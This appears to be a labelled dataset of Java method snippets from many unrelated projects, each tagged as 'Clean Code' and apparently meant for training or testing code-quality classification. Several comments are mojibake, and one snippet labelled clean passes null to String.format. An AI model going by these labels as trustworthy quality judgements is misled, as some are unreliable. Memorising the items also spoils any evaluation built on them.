  int widthValue=this.font.width(""New update available!"");
  if (this.updateComponent != null && d < widthValue && e > (this.height - 10) && e < this.height) {
    this.minecraft.setScreen(new ConfirmLinkScreen(bl -> {
      if (bl) {
        Iris.getUpdateChecker().getUpdateLink().ifPresent(Util.getPlatform()::openUri);
      }
      this.minecraft.setScreen(this);
    }
,Iris.getUpdateChecker().getUpdateLink().orElse(""""),true));
  }
  return super.mouseClicked(d,e,i);
}",0,Clean Code
"public SearchChatInfo getChatInfo(){
  return this.chatInfo;
}
",0,Clean Code
"/** 
 * <code>optional uint32 aeon_id = 8;</code>
 * @return the aeonId
 */
public int getAeonId(){
  return aeonId;
}",0,Clean Code
"/** 
 * @return factory for creating SwapLineupCsReq messages
 */
public static MessageFactory<SwapLineupCsReq> getFactory(){
  return SwapLineupCsReqFactory.INSTANCE;
}
",0,Clean Code
"/** 
 * <code>optional bool paused = 7;</code>
 * @return the paused
 */
public boolean getPaused(){
  return paused;
}",0,Clean Code
"/** 
 * Hash 瀛樺偍缂撳瓨
 * @param redisTemplate redisTemplate
 * @param key 涓婚敭
 * @param cacheMap 缂撳瓨Map
 */
public static void hAllPut(final RedisTemplate<String,Object> redisTemplate,final String key,final Map<String,Object> cacheMap){
  if (null == redisTemplate || null == key || null == cacheMap) {
    throw new RuntimeException(""鍏ュ弬[redisTemplate,key,cacheMap]蹇呭～"");
  }
  String cacheKeyByHash=StrUtil.addPrefixIfNot(key,CACHE_PREFIX_HASH);
  redisTemplate.opsForHash().putAll(cacheKeyByHash,cacheMap);
  LFU_NULL_CACHE.invalidate(key);
}
",0,Clean Code
"@Override public List<CricketWorldCup> cosineSimilaritySearch(String tableName,int topK,String queryEmbedding){
  String sql=String.format(null,tableName);
  return entityManager.createNativeQuery(sql,CricketWorldCup.class).setParameter(""topK"",topK).setParameter(""queryEmbedding"",queryEmbedding).getResultList();
}
",0,Clean Code
"@GetMapping(value=""/download/{fileId}"") @ApiOperation(value=""涓嬭浇鏂囦欢鎺ュ彛"") public void down(@PathVariable(""fileId"") Long fileId,HttpServletResponse response){
  adminFileService.download(fileId,response);
}
",0,Clean Code
"@Override public SimpleInfo clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  nickname.clear();
  signature.clear();
  assistSimpleInfo.clearQuick();
  return this;
}",0,Clean Code
"private RogueCommonBuff(){
}
",0,Clean Code
"@Override public int getContentResId(){
  return R.xml.getapps;
}
",0,Clean Code
"/** 
 * 瑙ｅ帇涓�涓枃浠�
 */
public static boolean unzipFile(String zipFileString,String outPathString,String fileParentName,String fileName){
  try {
    File outPath=new File(outPathString);
    if (!outPath.exists()) {
      outPath.mkdirs();
    }
    ZipFile zipFile=new ZipFile(zipFileString);
    InputStream is;
    Enumeration<? extends ZipEntry> e=zipFile.entries();
    ZipEntry entry;
    while (e.hasMoreElements()) {
      entry=e.nextElement();
      if (entry.getName().contains(fileParentName) && entry.getName().contains(fileName) && !entry.isDirectory()) {
        is=zipFile.getInputStream(entry);
        File dstFile=new File(outPathString + ""/"" + fileName);
        FileOutputStream fos=new FileOutputStream(dstFile);
        int len;
        byte[] buffer=new byte[8192];
        while ((len=is.read(buffer,0,buffer.length)) != -1) {
          fos.write(buffer,0,len);
        }
        fos.flush();
        fos.close();
        is.close();
        break;
      }
    }
  }
 catch (  IOException e) {
    e.printStackTrace();
    return false;
  }
  return true;
}",0,Clean Code
"private ItemStack createBannerFromShield(ItemStack shieldItem){
  if (!shieldItem.getComponents().isEmpty() || shieldItem.get(DataComponentTypes.BLOCK_ENTITY_DATA) == null || shieldItem.get(DataComponentTypes.BASE_COLOR) == null)   return null;
  ItemStack bannerItem=new ItemStack(Items.GRAY_BANNER);
  BannerPatternsComponent bannerPatternsComponent=bannerItem.get(DataComponentTypes.BANNER_PATTERNS);
  BannerPatternsComponent shieldPatternsComponent=shieldItem.get(DataComponentTypes.BANNER_PATTERNS);
  if (shieldPatternsComponent == null)   return bannerItem;
  bannerPatternsComponent.layers().addAll(shieldPatternsComponent.layers());
  return bannerItem;
}
",0,Clean Code
"public String toString(){
  return ""GProQQMsgListGuild{guildId="" + this.guildId + "",topTimestamp=""+ this.topTimestamp+ "",guildName=""+ this.guildName+ "",avatarSeq=""+ this.avatarSeq+ "",}"";
}
",0,Clean Code
"/** 
 * min .. max inclusive on both ends, to match Lucene's 
 */
public static int nextInt(Random random,int min,int max){
  return min + random.nextInt(1 + max - min);
}",0,Clean Code
"private void enterSearchMode(boolean animation){
  if (mSearchMode || mSearchBar == null || mSearchBarMover == null || mLeftDrawable == null) {
    return;
  }
  mSearchMode=true;
  mSearchBar.setState(SearchBar.STATE_SEARCH_LIST,animation);
  mSearchBarMover.returnSearchBarPosition(animation);
  mLeftDrawable.setArrow(ANIMATE_TIME);
}
",0,Clean Code
"@Override public boolean queueIdle(){
  Looper l=Looper.myLooper();
  if (l == null)   return true;
  if (l == mMainLooper) {
    Log.d(LOG_TAG,""main looper queueIdle"");
    if (shouldQuitLooper() && !mThreads.hasRunningThreads() && mMainLooperQuitHandler != null && mMainLooperQuitHandler.shouldQuit()) {
      Log.d(LOG_TAG,""main looper quit"");
      l.quit();
    }
  }
 else {
    Log.d(LOG_TAG,""looper queueIdle: "" + l);
    if (shouldQuitLooper()) {
      l.quit();
    }
  }
  return true;
}
",0,Clean Code
"@Override public RogueAeon clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  return this;
}",0,Clean Code
"public static void putChar(Object obj,long offset,char value){
  Platform.UNSAFE.putChar(obj,offset,value);
}
",0,Clean Code
"/** 
 * <code>optional uint32 tid = 8;</code>
 * @return whether the tid field is set
 */
public boolean hasTid(){
  return (bitField0_ & 0x00000008) != 0;
}",0,Clean Code
"@Override public FriendApplyInfo mergeFrom(final FriendApplyInfo other){
  if (other.isEmpty()) {
    return this;
  }
  cachedSize=-1;
  if (other.hasSimpleInfo()) {
    getMutableSimpleInfo().mergeFrom(other.simpleInfo);
  }
  return this;
}
!org.eclipse.jdt.core.dom.MethodDeclaration@1a33b434!org.eclipse.jdt.core.dom.MethodDeclaration@c2bf455",0,Clean Code
"public String toString(){
  return ""GProExposeRecommedsReq{user="" + this.user + "",traceId=""+ this.traceId+ "",stage=""+ this.stage+ "",exposeItems=""+ this.exposeItems+ "",}"";
}
",0,Clean Code
"@NonNull public ParcelFileDescriptor openFileDescriptor(String path,int mode) throws IOException {
  boolean read=false;
  boolean write=false;
  if ((mode & MODE_READ_WRITE) != 0) {
    read=true;
    write=true;
  }
 else   if ((mode & MODE_READ_ONLY) != 0) {
    read=true;
  }
 else   if ((mode & MODE_WRITE_ONLY) != 0) {
    write=true;
  }
 else {
    throw new IllegalArgumentException(""Bad mode: "" + mode);
  }
  if (read && write && !checkAccess(path,OsConstants.R_OK | OsConstants.W_OK)) {
    write=false;
  }
  if (read && !checkAccess(path,OsConstants.R_OK)) {
    throw new IOException(path + "" cannot be opened for both reading."");
  }
  if (write && !checkAccess(path,OsConstants.W_OK)) {
    throw new IOException(path + "" cannot be opened for both writing."");
  }
  Node<?> targetNode=getNode(path);
  if (targetNode == null) {
    throw new FileNotFoundException(path + "" does not exist."");
  }
  if (!targetNode.isFile()) {
    throw new IOException(path + "" is not a file."");
  }
  return ParcelFileDescriptor.open(getCachedFile(targetNode,write),mode);
}",0,Clean Code
"@Override public BattleTargetList clearQuick(){
  if (isEmpty()) {
    return this;
  }
  cachedSize=-1;
  bitField0_=0;
  battleTargetList.clearQuick();
  return this;
}",0,Clean Code
"protected final boolean isFloatOrIllegal(VirtualFrame frame){
  var kind=frame.getFrameDescriptor().getSlotKind(slot);
  return kind == FrameSlotKind.Double || kind == FrameSlotKind.Illegal;
}
",0,Clean Code
"public void setOptions(MiniMaxEmbeddingOptions options){
  this.options=options;
}
",0,Clean Code
"@Override public CfLogisticsStorehousePlatform update(CfLogisticsStorehousePlatform cfLogisticsStorehousePlatform){
  if (cfLogisticsStorehousePlatform.getUsedQueueCapacity() != null && cfLogisticsStorehousePlatform.getQueueCapacity() != null && cfLogisticsStorehousePlatform.getUsedQueueCapacity() >= cfLogisticsStorehousePlatform.getQueueCapacity()) {
    cfLogisticsStorehousePlatform.setPlatformStatus((byte)2);
  }
  cfLogisticsStorehousePlatformMapper.updateByPrimaryKeySelective(cfLogisticsStorehousePlatform);
  return cfLogisticsStorehousePlatform;
}",0,Clean Code
"public CopyBasicBlockAddressAction(final CombinedDiffNode node,final ESide side){
  super(side == ESide.PRIMARY ? ""Copy Primary Basic Block Address"" : ""Copy Secondary Basic Block Address"");
  checkNotNull(node);
  checkNotNull(side);
  this.node=side == ESide.PRIMARY ? node.getPrimaryDiffNode() : node.getSecondaryDiffNode();
  checkNotNull(this.node);
}
public CopyBasicBlockAddressAction(final SingleDiffNode node){
  super(""Copy Basic Block Address"");
  this.node=checkNotNull(node);
}
",0,Clean Code
"/** 
 * <code>optional uint32 retcode = 4;</code>
 * @param value the retcode to set
 * @return this
 */
public GetActivityScheduleConfigScRsp setRetcode(final int value){
  bitField0_|=0x00000001;
  retcode=value;
  return this;
}",0,Clean Code
"public void renderTranslucent(PoseStack poseStack,float tickDelta,Camera camera,GameRenderer gameRenderer,WorldRenderingPipeline pipeline){
  if (!canRender(camera,gameRenderer) || !isAnyHandTranslucent() || !IrisApi.getInstance().isShaderPackInUse()) {
    return;
  }
  ACTIVE=true;
  pipeline.setPhase(WorldRenderingPhase.HAND_TRANSLUCENT);
  poseStack.pushPose();
  Minecraft.getInstance().getProfiler().push(""iris_hand_translucent"");
  setupGlState(gameRenderer,camera,poseStack,tickDelta);
  gameRenderer.itemInHandRenderer.renderHandsWithItems(tickDelta,poseStack,bufferSource,Minecraft.getInstance().player,Minecraft.getInstance().getEntityRenderDispatcher().getPackedLightCoords(camera.getEntity(),tickDelta));
  poseStack.popPose();
  Minecraft.getInstance().getProfiler().pop();
  gameRenderer.resetProjectionMatrix(CapturedRenderingState.INSTANCE.getGbufferProjection());
  bufferSource.endBatch();
  pipeline.setPhase(WorldRenderingPhase.NONE);
  ACTIVE=false;
}
",0,Clean Code
"private void onClickViewChange(WView clickedView){
  if (clickedView != null && clickedView.equals(mClickedView) && clickedView.equals(mPreviousView)) {
    return;
  }
  mPreviousView=mClickedView;
  mDrawPaddingMargin=CodeLocatorUserConfig.loadConfig().isDrawViewPadding();
  mClickedView=clickedView;
  if (mOnClickListener != null) {
    mOnClickListener.onGetClickView(clickedView);
  }
  repaint();
}
",0,Clean Code
"private void dfs(char[][] grid,int i,int j){
  if (i < 0 || j < 0 || i == grid.length || j == grid[0].length || grid[i][j] != '1')   return;
  grid[i][j]='0';
  dfs(grid,i + 1,j);
  dfs(grid,i - 1,j);
  dfs(grid,i,j + 1);
  dfs(grid,i,j - 1);
}",0,Clean Code
"public MistralAiChatOptions build(){
  return this.options;
}
public MistralAiEmbeddingOptions build(){
  return this.options;
}
",0,Clean Code
"@Override public FileVisitResult visitFile(Path path,BasicFileAttributes attrs) throws IOException {
  String file=path.toAbsolutePath().toString();
  if (file.endsWith(""local_policy.jar"") || file.endsWith(""US_export_policy.jar"")) {
    return FileVisitResult.CONTINUE;
  }
  if (file.endsWith("".jar"") || file.endsWith("".jmod"")) {
    String fileMd5=FileUtils.getFileMD5(file);
    paths.put(fileMd5,file);
  }
  return FileVisitResult.CONTINUE;
}
@Override public FileVisitResult visitFile(Path path,BasicFileAttributes attrs) throws IOException {
  String file=path.toAbsolutePath().toString();
  if (file.endsWith("".jar"")) {
    map.get(""jar"").add(file);
  }
 else   if (file.endsWith("".class"")) {
    map.get(""classes"").add(file);
  }
 else   if (file.endsWith("".jmod"")) {
    map.get(""jmods"").add(file);
  }
 else   if (file.endsWith("".war"")) {
    map.get(""war"").add(file);
  }
 else   if (file.endsWith("".jsp"") || file.endsWith("".jspx"") || file.endsWith("".tld"")) {
    map.get(""jsp"").add(file);
  }
  return FileVisitResult.CONTINUE;
}
@Override public FileVisitResult visitFile(Path file,BasicFileAttributes attrs) throws IOException {
  Files.delete(file);
  return FileVisitResult.CONTINUE;
}
@Override public FileVisitResult visitFile(Path path,BasicFileAttributes attrs) throws IOException {
  String source=path.toAbsolutePath().toString();
  String filename=path.getFileName().toString();
  if (source.endsWith(""local_policy.jar"") || source.endsWith(""US_export_policy.jar"")) {
    return FileVisitResult.CONTINUE;
  }
  String dest;
  if (GlobalConfiguration.IS_USING_SETTING_JRE) {
    if (source.endsWith("".jar"")) {
      dest=String.join(File.separator,Arrays.asList(GlobalConfiguration.JRE_LIBS_PATH,filename));
      futures.add(plugin.transfer(source,dest));
      libraries.add(dest);
    }
 else     if (source.endsWith("".jmod"")) {
      dest=String.join(File.separator,Arrays.asList(GlobalConfiguration.JRE_LIBS_PATH,filename + "".jar""));
      futures.add(plugin.transfer(source,dest));
      libraries.add(dest);
    }
  }
 else {
    if (source.endsWith("".jar"") || source.endsWith("".jmod"")) {
      libraries.add(source);
    }
  }
  return FileVisitResult.CONTINUE;
}
@Override public FileVisitResult visitFile(Path path,BasicFileAttributes attrs) throws IOException {
  String file=path.toAbsolutePath().toString();
  if (file.endsWith("".jar"") || file.endsWith("".jmod"")) {
    paths.add(file);
  }
  return FileVisitResult.CONTINUE;
}",0,Clean Code
"private void guideDownloadThumb(){
  MainActivity activity=getActivity2();
  if (null == activity || !Settings.getGuideDownloadThumb() || null == mLayoutManager || null == mRecyclerView) {
    guideDownloadLabels();
    return;
  }
  int position=mLayoutManager.findFirstCompletelyVisibleItemPositions(null)[0];
  if (position < 0) {
    guideDownloadLabels();
    return;
  }
  RecyclerView.ViewHolder holder=mRecyclerView.findViewHolderForAdapterPosition(position);
  if (null == holder) {
    guideDownloadLabels();
    return;
  }
  mShowcaseView=new ShowcaseView.Builder(activity).withMaterialShowcase().setStyle(R.style.Guide).setTarget(new ViewTarget(((DownloadHolder)holder).thumb)).blockAllTouches().setContentTitle(R.string.guide_download_thumb_title).setContentText(R.string.guide_download_thumb_text).replaceEndButton(R.layout.button_guide).setShowcaseEventListener(new SimpleShowcaseEventListener(){
    @Override public void onShowcaseViewDidHide(    ShowcaseView showcaseView){
      mShowcaseView=null;
      ViewUtils.removeFromParent(showcaseView);
      Settings.putGuideDownloadThumb(false);
      guideDownloadLabels();
    }
  }
).build();
}",0,Clean Code
"public boolean getIsTop(){
  return this.isTop;
}
",0,Clean Code
"@Override public SetHeroBasicTypeScRsp create(){
  return SetHeroBasicTypeScRsp.newInstance();
}
",0,Clean Code
"public int getNextPage(){
  return this.nextPage;
}
",0,Clean Code
"public static Node midOrUpMidPreNode(Node head){
  if (head == null || head.next == null || head.next.next == null) {
    return null;
  }
  Node slow=head;
  Node fast=head.next.next;
  while (fast.next != null && fast.next.next != null) {
    slow=slow.next;
    fast=fast.next.next;
  }
  return slow;
}
",0,Clean Code
"@Override public J.MethodDeclaration visitMethodDeclaration(J.MethodDeclaration method,ExecutionContext ctx){
  Boolean checkConstructor=null;
  if (method.isConstructor()) {
    checkConstructor=getCursor().getNearestMessage(""CHECK_CONSTRUCTOR"") != null;
  }
  if (checkConstructor != null && checkConstructor || isEmptyMethod(method)) {
    method=SearchResult.found(method);
  }
  return super.visitMethodDeclaration(method,ctx);
}
",0,Clean Code
"public void cancelTyping(int action,long dialogId,int threadMsgId){
  if (action < 0 || action >= sendingTypings.length || sendingTypings[action] == null) {
    return;
  }
  LongSparseArray<SparseArray<Boolean>> dialogs=sendingTypings[action];
  SparseArray<Boolean> threads=dialogs.get(dialogId);
  if (threads == null) {
    return;
  }
  threads.remove(threadMsgId);
  if (threads.size() == 0) {
    dialogs.remove(dialogId);
  }
}",0,Clean Code
"@Override public void onConfigurationChanged(@NonNull Configuration newConfig){
  super.onConfigurationChanged(newConfig);
  if (isPort() && newConfig.orientation == 1 && !isRotate())   exitFullscreen();
  if (isPort() && newConfig.orientation == 2)   enterFullscreen();
  if (isFullscreen())   Util.hideSystemUI(this);
}",0,Clean Code
"private void resendCodeFromSafetyNet(Bundle params,TLRPC.auth_SentCode res){
  if (!isRequestingFirebaseSms) {
    return;
  }
  needHideProgress(false);
  isRequestingFirebaseSms=false;
  TLRPC.TL_auth_resendCode req=new TLRPC.TL_auth_resendCode();
  req.phone_number=params.getString(""phoneFormated"");
  req.phone_code_hash=res.phone_code_hash;
  ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    if (response != null) {
      AndroidUtilities.runOnUIThread(() -> fillNextCodeParams(params,(TLRPC.auth_SentCode)response));
    }
 else {
      AndroidUtilities.runOnUIThread(() -> {
        if (getParentActivity() == null || getParentActivity().isFinishing() || getContext() == null) {
          return;
        }
        new AlertDialog.Builder(getContext()).setTitle(getString(R.string.RestorePasswordNoEmailTitle)).setMessage(getString(R.string.SafetyNetErrorOccurred)).setPositiveButton(getString(R.string.OK),(dialog,which) -> {
          forceDisableSafetyNet=true;
          if (currentViewNum != VIEW_PHONE_INPUT) {
            setPage(VIEW_PHONE_INPUT,true,null,true);
          }
        }
).show();
      }
);
    }
  }
,ConnectionsManager.RequestFlagFailOnServerErrors | ConnectionsManager.RequestFlagWithoutLogin);
}
",0,Clean Code
"private void tryResetAccount(String requestPhone,String phoneHash,String phoneCode){
  if (radialProgressView.getTag() != null) {
    return;
  }
  AlertDialog.Builder builder=new AlertDialog.Builder(getParentActivity());
  builder.setMessage(LocaleController.getString(""ResetMyAccountWarningText"",R.string.ResetMyAccountWarningText));
  builder.setTitle(LocaleController.getString(""ResetMyAccountWarning"",R.string.ResetMyAccountWarning));
  builder.setPositiveButton(LocaleController.getString(""ResetMyAccountWarningReset"",R.string.ResetMyAccountWarningReset),(dialogInterface,i) -> {
    needShowProgress(0);
    TLRPC.TL_account_deleteAccount req=new TLRPC.TL_account_deleteAccount();
    req.reason=""Forgot password"";
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> AndroidUtilities.runOnUIThread(() -> {
      needHideProgress(false);
      if (error == null) {
        if (requestPhone == null || phoneHash == null || phoneCode == null) {
          setPage(VIEW_PHONE_INPUT,true,null,true);
          return;
        }
        Bundle params=new Bundle();
        params.putString(""phoneFormated"",requestPhone);
        params.putString(""phoneHash"",phoneHash);
        params.putString(""code"",phoneCode);
        setPage(VIEW_REGISTER,true,params,false);
      }
 else {
        if (error.text.equals(""2FA_RECENT_CONFIRM"")) {
          needShowAlert(LocaleController.getString(R.string.RestorePasswordNoEmailTitle),LocaleController.getString(""ResetAccountCancelledAlert"",R.string.ResetAccountCancelledAlert));
        }
 else         if (error.text.startsWith(""2FA_CONFIRM_WAIT_"")) {
          Bundle params=new Bundle();
          params.putString(""phoneFormated"",requestPhone);
          params.putString(""phoneHash"",phoneHash);
          params.putString(""code"",phoneCode);
          params.putInt(""startTime"",ConnectionsManager.getInstance(currentAccount).getCurrentTime());
          params.putInt(""waitTime"",Utilities.parseInt(error.text.replace(""2FA_CONFIRM_WAIT_"","""")));
          setPage(VIEW_RESET_WAIT,true,params,false);
        }
 else {
          needShowAlert(LocaleController.getString(R.string.RestorePasswordNoEmailTitle),error.text);
        }
      }
    }
),ConnectionsManager.RequestFlagWithoutLogin | ConnectionsManager.RequestFlagFailOnServerErrors);
  }
);
  builder.setNegativeButton(LocaleController.getString(""Cancel"",R.string.Cancel),null);
  showDialog(builder.create());
}",0,Clean Code
"@Override public void init(){
  findAndHookMethod(""com.miui.mediaeditor.api.MediaEditorApiHelper"",""isMagicMattingAvailable"",new BaseHook.MethodHook(){
    @Override protected void before(    XC_MethodHook.MethodHookParam param) throws Throwable {
      param.setResult(true);
    }
  }
);
}
",0,Clean Code
"@Override public void getDependencies(Set<String> deps){
  getValueType().getDependencies(deps);
}
",0,Clean Code
"static Set<Method> getAnnotatedMethodsInBaseType(Class<?> baseType){
  boolean ifcCheck=baseType.isInterface();
  if (ifcCheck && ClassUtils.isJavaLanguageInterface(baseType)) {
    return Collections.emptySet();
  }
  Set<Method> annotatedMethods=annotatedBaseTypeCache.get(baseType);
  if (annotatedMethods != null) {
    return annotatedMethods;
  }
  Method[] methods=(ifcCheck ? baseType.getMethods() : baseType.getDeclaredMethods());
  for (  Method baseMethod : methods) {
    try {
      if ((ifcCheck || !Modifier.isPrivate(baseMethod.getModifiers())) && hasSearchableAnnotations(baseMethod)) {
        if (annotatedMethods == null) {
          annotatedMethods=new HashSet<>();
        }
        annotatedMethods.add(baseMethod);
      }
    }
 catch (    Throwable ex) {
      handleIntrospectionFailure(baseMethod,ex);
    }
  }
  if (annotatedMethods == null) {
    annotatedMethods=Collections.emptySet();
  }
  annotatedBaseTypeCache.put(baseType,annotatedMethods);
  return annotatedMethods;
}
",0,Clean Code
"/** 
 * Loads the index data for the given cache UID.
 * @param uid The UID of the cache whose index is to be loaded.
 * @throws IOException If an error occurs initializing the index data.
 */
public void initialize(long uid) throws IOException {
  storage.initialize(uid);
  if (previousStorage != null) {
    previousStorage.initialize(uid);
  }
  if (!storage.exists() && previousStorage != null && previousStorage.exists()) {
    previousStorage.load(keyToContent,idToKey);
    storage.storeFully(keyToContent);
  }
 else {
    storage.load(keyToContent,idToKey);
  }
  if (previousStorage != null) {
    previousStorage.delete();
    previousStorage=null;
  }
}
/** 
 * Initializes the storage for the given cache UID. 
 */
void initialize(long uid);
@Override public void initialize(long uid){
}
@Override public void initialize(long uid){
  hexUid=Long.toHexString(uid);
  tableName=getTableName(hexUid);
}
",0,Clean Code
"@Override public Object id(){
  return id;
}
/** 
 * @param id The ID of the {@link ChatMemory}. If not provided, a ""default"" will be used.
 * @return builder
 */
public Builder id(Object id){
  this.id=id;
  return this;
}
",0,Clean Code
"@Test public void testDynamicForkTaskCoversion(){
  DynamicFork dynamicTask=new DynamicFork(""task_ref_name"",""forkTasks"",""forkTaskInputs"");
  WorkflowTask workflowTask=dynamicTask.getWorkflowDefTasks().get(0);
  assertNotNull(workflowTask.getInputParameters());
  Task fromWorkflowTask=TaskRegistry.getTask(workflowTask);
  assertTrue(fromWorkflowTask instanceof DynamicFork);
  DynamicFork taskFromWorkflowTask=(DynamicFork)fromWorkflowTask;
  assertNotNull(fromWorkflowTask);
  assertEquals(dynamicTask.getName(),fromWorkflowTask.getName());
  assertEquals(dynamicTask.getTaskReferenceName(),fromWorkflowTask.getTaskReferenceName());
  assertEquals(dynamicTask.getType(),taskFromWorkflowTask.getType());
  assertEquals(dynamicTask.getStartDelay(),taskFromWorkflowTask.getStartDelay());
  assertEquals(dynamicTask.getInput(),taskFromWorkflowTask.getInput());
  assertEquals(dynamicTask.getForkTasksParameter(),taskFromWorkflowTask.getForkTasksParameter());
  assertEquals(dynamicTask.getForkTasksInputsParameter(),taskFromWorkflowTask.getForkTasksInputsParameter());
}",0,Clean Code
"public void onPauseInternal(){
  PowerManager pm=(PowerManager)activity.getSystemService(Context.POWER_SERVICE);
  boolean screenOn;
  if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
    screenOn=pm.isInteractive();
  }
 else {
    screenOn=pm.isScreenOn();
  }
  boolean hasPermissionsToPip=AndroidUtilities.checkInlinePermissions(activity);
  if (canSwitchToPip && hasPermissionsToPip) {
    int h=instance.windowView.getMeasuredHeight();
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH && instance.lastInsets != null) {
      h-=instance.lastInsets.getSystemWindowInsetBottom();
    }
    VoIPPiPView.show(instance.activity,instance.currentAccount,instance.windowView.getMeasuredWidth(),h,VoIPPiPView.ANIMATION_ENTER_TYPE_SCALE);
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH && instance.lastInsets != null) {
      VoIPPiPView.topInset=instance.lastInsets.getSystemWindowInsetTop();
      VoIPPiPView.bottomInset=instance.lastInsets.getSystemWindowInsetBottom();
    }
  }
  if (currentUserIsVideo && (!hasPermissionsToPip || !screenOn)) {
    VoIPService service=VoIPService.getSharedInstance();
    if (service != null) {
      service.setVideoState(false,Instance.VIDEO_STATE_PAUSED);
    }
  }
}
",0,Clean Code
"/** 
 * 鑾峰彇鐢ㄦ埛鐨勫姩鎬佷俊鎭�
 * @param userId
 * @param currentPage
 * @param pageSize
 * @return
 */
@Override public PageInfo<DynamicDTO> getByUserId(Long userId,Integer currentPage,Integer pageSize){
  DynamicPoExample example=new DynamicPoExample();
  example.createCriteria().andUserIdEqualTo(userId);
  example.setOrderByClause(""create_time desc"");
  PageHelper.startPage(currentPage,pageSize);
  List<DynamicPo> dynamicPos=dynamicPoMapper.selectByExample(example);
  PageInfo<DynamicDTO> pageInfo=DynamicMS.INSTANCE.toPage(new PageInfo<>(dynamicPos));
  if (CollectionUtils.isNotEmpty(pageInfo.getList())) {
    pageInfo.getList().forEach(dynamicDTO -> {
      UserDTO userDTO=userService.getById(dynamicDTO.getUserId());
      dynamicDTO.setUserName(userDTO.getName());
      dynamicDTO.setPicture(userDTO.getPicture());
      if (DynamicTypeEnum.writeArticle.name().equals(dynamicDTO.getType()) || DynamicTypeEnum.likeArticle.name().equals(dynamicDTO.getType()) || DynamicTypeEnum.commentArticle.name().equals(dynamicDTO.getType())) {
        List<ArticleDTO> articleDTOS=articleService.getByIds(Collections.singletonList(Integer.parseInt(dynamicDTO.getObjectId())),null,null);
        dynamicDTO.setTitle(articleDTOS.get(0).getTitle());
      }
      if (DynamicTypeEnum.likeComment.name().equals(dynamicDTO.getType()) || DynamicTypeEnum.commentReply.name().equals(dynamicDTO.getType())) {
        List<ArticleDTO> articleDTOS=articleService.getByIds(Collections.singletonList(Integer.parseInt(dynamicDTO.getObjectId())),null,null);
        dynamicDTO.setTitle(articleDTOS.get(0).getTitle() + "" > "" + CommonUtils.html2Text(commentService.getById(dynamicDTO.getCommentId()).getContent()));
      }
      if (DynamicTypeEnum.followUser.name().equals(dynamicDTO.getType())) {
        UserDTO userDTO1=userService.getById(Long.parseLong(dynamicDTO.getObjectId()));
        dynamicDTO.setTitle(userDTO1.getName());
      }
    }
);
  }
  return pageInfo;
}",0,Clean Code
"@Override public void readToByteBuffer(ByteBuffer dst,int length){
  MemoryBuffer buf=memoryBuffer;
  int remaining=buf.remaining();
  if (remaining >= length) {
    buf.read(dst,length);
  }
 else {
    buf.read(dst,remaining);
    try {
      int dstLimit=dst.limit();
      int newLimit=dst.position() + length - remaining;
      if (dstLimit > newLimit) {
        dst.limit(newLimit);
        channel.read(dst);
        dst.limit(dstLimit);
      }
 else {
        channel.read(dst);
      }
    }
 catch (    IOException e) {
      throw new DeserializationException(""Failed to read the provided byte channel"",e);
    }
  }
}
@Override public int readToByteBuffer(ByteBuffer dst){
  MemoryBuffer buf=memoryBuffer;
  int remaining=buf.remaining();
  if (remaining > 0) {
    buf.read(dst,remaining);
  }
  try {
    return channel.read(dst) + remaining;
  }
 catch (  IOException e) {
    throw new DeserializationException(""Failed to read the provided byte channel"",e);
  }
}",0,Clean Code
"private static void write(VectorSchemaRoot root,WritableByteChannel byteChannel){
  try (ArrowStreamWriter writer=new ArrowStreamWriter(root,null,byteChannel)){
    writer.writeBatch();
  }
 catch (  IOException e) {
    Platform.throwException(e);
  }
}
",0,Clean Code
"@Operation(summary=""鍋滄瑙嗛鍥炴斁"",security=@SecurityRequirement(name=JwtUtils.HEADER)) @Parameter(name=""deviceId"",description=""璁惧鍥芥爣缂栧彿"",required=true) @Parameter(name=""channelId"",description=""閫氶亾鍥芥爣缂栧彿"",required=true) @Parameter(name=""stream"",description=""娴両D"",required=true) @GetMapping(""/stop/{deviceId}/{channelId}/{stream}"") public void playStop(@PathVariable String deviceId,@PathVariable String channelId,@PathVariable String stream){
  if (ObjectUtils.isEmpty(deviceId) || ObjectUtils.isEmpty(channelId) || ObjectUtils.isEmpty(stream)) {
    throw new ControllerException(ErrorCode.ERROR400);
  }
  Device device=storager.queryVideoDevice(deviceId);
  if (device == null) {
    throw new ControllerException(ErrorCode.ERROR400.getCode(),""璁惧锛�"" + deviceId + "" 鏈壘鍒�"");
  }
  try {
    cmder.streamByeCmd(device,channelId,stream,null);
  }
 catch (  InvalidArgumentException|ParseException|SipException|SsrcTransactionNotFoundException e) {
    throw new ControllerException(ErrorCode.ERROR100.getCode(),""鍙戦�乥ye澶辫触锛� "" + e.getMessage());
  }
}",0,Clean Code
"@Override public void onFling(float velocityX,float velocityY){
  if (mCurrent == null || mOffset != 0 || !mCurrent.getImageView().isLoaded() || !mCurrent.getImageView().canFling()) {
    return;
  }
  ImageView image=mCurrent.getImageView();
  mPageFling.startFling((int)velocityX,image.getMinDx(),image.getMaxDx(),(int)velocityY,image.getMinDy(),image.getMaxDy());
}",0,Clean Code
"private Color getDrawRectColor(int left,int top,int width,int height,Color[] colors){
  Image image=null;
  if (mScreenCapImage == null) {
    return colors[0];
  }
  if (mScreenCapImage instanceof BufferedImage) {
    image=mScreenCapImage;
  }
 else {
    try {
      final Method getBufferedImage=ReflectUtils.getClassMethod(mScreenCapImage.getClass(),""getBufferedImage"");
      if (getBufferedImage == null) {
        return colors[0];
      }
      image=(Image)getBufferedImage.invoke(mScreenCapImage);
    }
 catch (    Throwable t) {
      Log.e(""鍙嶅皠鑾峰彇getBufferedImage澶辫触"",t);
    }
  }
  if (!(image instanceof BufferedImage) || width <= 0 || height <= 0) {
    return colors[0];
  }
  left=CoordinateUtils.convertPanelXToPhoneX(mApplication,left,1,0);
  top=CoordinateUtils.convertPanelYToPhoneY(mApplication,top,1,0);
  width=CoordinateUtils.convertPanelDistanceToPhoneDistance(mApplication,width);
  height=CoordinateUtils.convertPanelDistanceToPhoneDistance(mApplication,height);
  int index=0;
  for (index=0; index < colors.length; index++) {
    if (!isColorTooSimilar((BufferedImage)image,left,top,width,height,colors[index])) {
      return colors[index];
    }
  }
  return colors[0];
}",0,Clean Code
